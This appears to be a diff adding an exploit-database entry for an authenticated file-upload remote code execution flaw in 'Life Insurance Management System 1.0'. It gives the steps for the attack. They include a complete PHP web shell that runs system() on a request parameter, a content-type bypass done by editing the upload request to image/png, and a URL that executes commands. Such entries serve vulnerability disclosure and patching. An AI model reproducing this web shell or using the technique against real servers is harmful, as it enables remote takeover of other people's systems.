@@ -1,0 +1,24 @@
+# Exploit Title: Life Insurance Management System 1.0 - File Upload RCE (Authenticated)
+# Date: 15/1/2021
+# Exploit Author: Aitor Herrero
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/php/14665/life-insurance-management-system-php-full-source-code.html
+# Version: 1.0
+# Tested on: Windows /linux /
+
+Login in the application
+
+Go to Clients and you can add new client o modify existent
+
+Click examination botton and upload a test.php with content:
+
+"<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd =
+($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>"
+
+Click Upload and intercept with burpsuite
+
+Change the content type to image/png
+
+Go to the path
+
+http://localhost:8080/lims/uploads/test.php?cmd=dir
